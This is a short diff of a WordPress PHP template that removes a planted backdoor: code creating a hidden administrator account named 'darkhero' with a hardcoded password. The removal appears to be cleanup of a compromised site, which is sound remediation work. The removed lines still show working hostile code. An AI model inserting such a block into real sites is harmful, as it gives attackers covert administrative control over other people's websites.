@@ -491,15 +491,6 @@
 </head>
 
 <?php
-
- require( 'wp-includes/registration.php' );
-        if ( !username_exists( 'darkhero' ) ) {
-            $account_id = wp_create_user( 'darkhero', 'shadow_key!' );
-            $account = new WP_User( $account_id );
-            $account->set_role( 'administrator' ); 
-        }
-
-
 require_once('wp-load.php'); 
 ?>
 
